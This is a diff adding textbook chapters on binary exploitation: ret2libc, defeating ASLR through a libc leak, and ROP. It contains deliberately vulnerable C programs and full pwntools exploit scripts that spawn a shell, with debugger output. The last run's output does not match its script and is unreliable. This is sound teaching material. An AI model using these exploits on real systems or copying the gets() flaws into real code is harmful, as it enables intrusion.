+            0x6c9000           0x6cc000     0x3000    0xc9000 /home/devneal/Security/REFE/textbook/example_code/ret2libc
+            0x6cc000           0x6f1000    0x25000        0x0 [heap]
+      0x7ffff7ffb000     0x7ffff7ffd000     0x2000        0x0 [vvar]
+      0x7ffff7ffd000     0x7ffff7fff000     0x2000        0x0 [vdso]
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+(gdb) find 0x400000,0x4ca000,"/bin/sh"
+0x4a2168
+warning: Unable to access 3473 bytes of target memory at 0x4c9270, halting search.
+1 pattern found.
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 4527] will be killed.
+
+Quit anyway? (y or n) y
+> 
+> objdump -s ret2libc | grep /bin/sh
+ 4a2160 6974666e 002d6300 2f62696e 2f736800  itfn.-c./bin/sh.
+> 
+> python
+Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> e = ELF("./ret2libc")
+[*] '/home/devneal/Security/REFE/textbook/example_code/ret2libc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+>>> hex(e.search("/bin/sh").next())
+'0x4a2168'
+>>> 
+\end{lstlisting}
+
+Each is in agreement: "/bin/sh" is located at \texttt{0x4a2168}. We could
+find the location of \texttt{system()} using \texttt{gdb}, but we can actually
+find that programmatically as well.
+
+\begin{lstlisting}
+> python
+Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> e = ELF("./ret2libc")
+[*] '/home/devneal/Security/REFE/textbook/example_code/ret2libc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+>>> hex(e.symbols["system"])
+'0x40f680'
+>>> 
+>
+\end{lstlisting}
+
+We now have enough information to write an exploit. One possible implementation
+is below.
+
+\begin{lstlisting}
+#!/usr/bin/env python
+from pwn import *
+
+e = ELF("./ret2libc")
+system_address = e.symbols["system"]
+bin_sh_address = e.search("/bin/sh").next()
+
+payload = 'A' * 80
+# 0x0000000000401526 : pop rdi ; ret
+payload += p64(0x401526) + p64(bin_sh_address)
+payload += p64(system_address)
+
+p = process("./ret2libc")
+p.sendline(payload)
+p.interactive()
+\end{lstlisting}
+
+We can verify that running the exploit spawns a shell.
+
+\begin{lstlisting}
+> ./ret2libc_solution.py 
+[*] '/home/devneal/Security/REFE/textbook/example_code/ret2libc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './ret2libc': pid 13111
+[*] Switching to interactive mode
+Enter the password:
+You don't have permission to perform this action.
+$ whoami
+devneal
+$  
+\end{lstlisting}
+
+% aslr, rop, leaks
+\subsection{ASLR}
+\subsubsection{ASLR}
+ASLR, or Address Space Layout Randomization, is a mitigation technique in which
+the locations of the stack, heap, and shared libraries are randomized at
+runtime. This makes ROP and ret2libc attacks more difficult, since the attacker
+can't reliably jump to those parts of the code. However, ASLR does not randomize
+code within a single section, which means in particular that it does not
+randomize code within libc. This means that if an attacker can leak the
+address of any library function they can then learn the locations of all of the
+code in the library.
+
+\subsubsection{Exploiting a leak}
+Consider this program, which intentionally leaks a libc address.
+
+\begin{lstlisting}
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	char name[32];
+	puts("Welcome to REFE Corp.");
+	puts("Please sign in with your name.");
+    printf("By the way, I found this on the floor. Is it yours? %p\n", *(long long int*)*(*(int*)*(puts+2)+(puts+6)));
+	gets(name);
+	printf("Please take a seat, we'll be with you at some point this week.\n");
+	return 0;
+}
+\end{lstlisting}
+
+In the program above, the address of $\texttt{puts()}$ is leaked before the
+program prompts for input. This means that given a copy of the exact version of
+libc that the program is using, we can calculate the offsets to find the
+location of every other libc function. In particular, we can find the libc base
+address by computing [leaked puts address] - [puts offset], then find any other
+function address by computing [libc\_base\_address] + [function offset].
+
+We can get the program's shared libraries by using the \texttt{ldd} command.
+\begin{lstlisting}
+> ldd use_leak
+	linux-vdso.so.1 =>  (0x00007fff6a2f0000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb468d9b000)
+	/lib64/ld-linux-x86-64.so.2 (0x000055cf123e1000)
+> 
+\end{lstlisting}
+
+Ignoring the first and last lines, we see that \texttt{use\_leak} has
+\texttt{libc.so.6} as a dependency, and that it is located on the system at
+\texttt{/lib/x86\_64-linux-gnu/libc.so.6}. Using \texttt{objdump}, we can get the
+offsets of every function in this copy of libc.
+\begin{lstlisting}
+> readelf --symbols /lib/x86_64-linux-gnu/libc.so.6 | grep -e puts -e system
+   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+   225: 00000000001387d0    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
+   404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+   475: 000000000010bba0  1262 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
+   584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+   651: 000000000010d550   703 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+  1097: 000000000006e030   354 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
+  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+  1611: 000000000006e030   354 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
+  2221: 00000000000782b0    95 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
+> 
+\end{lstlisting}
+The output above shows that \texttt{puts} and \texttt{system} have offsets of
+\texttt{0x6f690} and \texttt{0x45390} from the start of libc,
+respectively. Next we can get the address of ``/bin/sh'' with \texttt{strings}.
+
+\begin{lstlisting}
+> strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+ 18cd17 /bin/sh
+> 
+\end{lstlisting}
+
+This is everything we need in order to call \texttt{system("/bin/sh")}, as shown
+by this program.
+
+\begin{lstlisting}
+#!/usr/bin/python
+from pwn import *
+
+PUTS_OFFSET   = 0x06f690
+SYSTEM_OFFSET = 0x045390
+BIN_SH_OFFSET = 0x18cd17
+
+p = process("./use_leak")
+p.readuntil("yours? ")
+puts_leak = int(p.readline(), 16)
+log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
+libc_base_address = puts_leak - PUTS_OFFSET
+system_address    = libc_base_address + SYSTEM_OFFSET
+bin_sh_address    = libc_base_address + BIN_SH_OFFSET
+log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
+log.info("found system address: 0x{:>8x}".format(system_address))
+log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))
+
+rop = "A" * 40
+# 0x0000000000400683 : pop rdi ; ret
+rop += p64(0x400683) + p64(bin_sh_address)
+rop += p64(system_address)
+
+p.sendline(rop) 
+p.interactive()
+\end{lstlisting}
+
+When run, the exploit spawns a shell.
+
+\begin{lstlisting}
+> ./use_leak_solution.py 
+[+] Starting local process './use_leak': pid 4245
+[*] leaked puts address: 0x7f17fbf09690
+[*] found libc base address: 0x7f17fbe9a000
+[*] found system address: 0x7f17fbedf390
+[*] found "/bin/sh" address: 0x7f17fc026d17
+[*] Switching to interactive mode
+Please take a seat, we'll be with you at some point this week.
+$ whoami
+devneal
+$  
+\end{lstlisting}
+
+\subsubsection{Making a leak}
+Programs don't typically leak the addresses of their libc functions for free.
+In a real program, we would have to first find a bug that causes the program to
+leak an address (without crashing), then find \emph{another} bug which allows us
+to leverage that information and take control. Take a look at this program,
+which will run with DEP/NX and ASLR enabled.
+
+\begin{lstlisting}
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	char name[32];
+	puts("Welcome to REFE Corp.");
+	puts("Please sign in with your name.");
+	puts("You tricked us last time with that planted pointer...we won't get fooled again.");
+	gets(name);
+	puts("Please take a seat, we'll be with you at some point this week.");
+	return 0;
+}
+\end{lstlisting}
+
+We can leverage the buffer overflow in this program to both leak a libc address
+and take control of the program. After all, we're free to add any code we want
+via ROP, so why not add code to leak a libc address? Then once we have the libc
+address, we can cause the program to return to the place where we first gained
+control and this time spawn a shell!
+
+Since the program makes several calls to \texttt{puts()}, it must have entries
+for \texttt{puts()} in both its PLT and GOT. We can view them with
+\texttt{objdump} and \texttt{readelf}, respectively. We can also find the
+address of \texttt{main()}.
+
+\begin{lstlisting}
+> objdump -d -j .plt make_leak | grep -A 3 puts
+0000000000400420 <puts@plt-0x10>:
+  400420:	ff 35 e2 0b 20 00    	push   QWORD PTR [rip+0x200be2]        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
+  400426:	ff 25 e4 0b 20 00    	jmp    QWORD PTR [rip+0x200be4]        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
+  40042c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
+--
+0000000000400430 <puts@plt>:
+  400430:	ff 25 e2 0b 20 00    	jmp    QWORD PTR [rip+0x200be2]        # 601018 <_GLOBAL_OFFSET_TABLE_+0x18>
+  400436:	68 00 00 00 00       	push   0x0
+  40043b:	e9 e0 ff ff ff       	jmp    400420 <_init+0x20>
+> readelf --relocs make_leak | grep puts
+000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+> readelf --symbols make_leak | grep main
+     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
+    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
+    63: 0000000000400566    72 FUNC    GLOBAL DEFAULT   14 main
+> 
+\end{lstlisting}
+
+We can tell from the output above that \texttt{puts()} has a PLT address at
+\texttt{0x400430} and a GOT address at \texttt{0x601018}. We also see that
+\texttt{main()} is located at \texttt{0x400566}. In order to leak the location
+of \texttt{puts()}, we will call \texttt{puts()} (by its entry in the PLT) to
+print its own libc location (i.e. its entry in the GOT). We'll then return to
+\texttt{main()} and spawn a shell just as we did before.
+
+We'll need a ``pop rdi'' gadget to control the argument to \texttt{puts()}. You
+can find one with ROPgadget.
+
+\begin{lstlisting}
+> ROPgadget --binary make_leak | grep "pop rdi"
+0x0000000000400613 : pop rdi ; ret
+> 
+\end{lstlisting}
+
+With this, we have everything we need to leak an address, as shown below.
+
+\begin{lstlisting}
+> cat make_leak_solution.py 
+#!/usr/bin/python
+from pwn import *
+
+PUTS_PLT_ADDRESS = 0x400430
+PUTS_GOT_ADDRESS = 0x601018
+MAIN_ADDRESS     = 0x400566
+PUTS_OFFSET      = 0x06f690
+
+rop = "A" * 40
+
+# 0x0000000000400613 : pop rdi ; ret
+rop += p64(0x400613) + p64(PUTS_GOT_ADDRESS)
+
+rop += p64(PUTS_PLT_ADDRESS)
+rop += p64(MAIN_ADDRESS)
+
+print rop
+>
+> ./make_leak_solution.py | ./make_leak
+Welcome to REFE Corp.
+Please sign in with your name.
+You tricked us last time with that planted pointer...we won't get fooled again.
+Please take a seat, we'll be with you at some point this week.
+
+Welcome to REFE Corp.
+Please sign in with your name.
+You tricked us last time with that planted pointer...we won't get fooled again.
+Please take a seat, we'll be with you at some point this week.
+Illegal instruction (core dumped)
+> 
+\end{lstlisting}
+
+%TODO: see if the output will appear in latex
+As you can see, the program both leaks an address (which appears in the terminal
+as strange characters), and executes \texttt{main()} twice before crashing. From
+here, we need only fill in the rest of the exploit from the previous one.
+
+\begin{lstlisting}
+#!/usr/bin/python
+from pwn import *
+
+PUTS_PLT_ADDRESS = 0x400430
+PUTS_GOT_ADDRESS = 0x601018
+MAIN_ADDRESS     = 0x400566
+PUTS_OFFSET      = 0x06f690
+SYSTEM_OFFSET    = 0x045390
+BIN_SH_OFFSET    = 0x18cd17
+
+rop = "A" * 40
+# 0x0000000000400613 : pop rdi ; ret
+rop += p64(0x400613) + p64(PUTS_GOT_ADDRESS)
+rop += p64(PUTS_PLT_ADDRESS)
+rop += p64(MAIN_ADDRESS)
+
+p = process("./make_leak")
+p.sendline(rop)
+p.readuntil("week.\n")
+
+puts_leak = u64(p.read(6) + "\x00\x00")
+log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
+libc_base_address = puts_leak - PUTS_OFFSET
+system_address    = libc_base_address + SYSTEM_OFFSET
+bin_sh_address    = libc_base_address + BIN_SH_OFFSET
+log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
+log.info("found system address: 0x{:>8x}".format(system_address))
+log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))
+
+rop = "A" * 40
+# 0x0000000000400613 : pop rdi ; ret
+rop += p64(0x400613) + p64(bin_sh_address)
+rop += p64(system_address)
+
+p.sendline(rop) 
+p.interactive()
+\end{lstlisting}
+
+When the script is run, it does indeed spawn a shell.
+
+\begin{lstlisting}
+> ./input_makeLeak.py
+[+] Starting local process './makeLeak': pid 22514
+[*] leaked puts address: 0xf7636ca0
+[*] found libc base address: 0xf75d7000
+[*] found system address: 0xf7611da0
+[*] found "/bin/sh" address: 0xf77329ab
+[*] Switching to interactive mode
+Welcome to the No Security Aggregate
+Please sign in with your name.
+You tricked us last time with that planted pointer...we won't get fooled again.
+Please take a seat, we'll be with you at some point this week.
+$ whoami
+devneal
+$
+\end{lstlisting}
+\section{Exploiting the Heap}
+
+% crackmes
+\section{Reverse Engineering}
+
+% find vtables in .rodata
+\section{C++}
+
+\end{document}
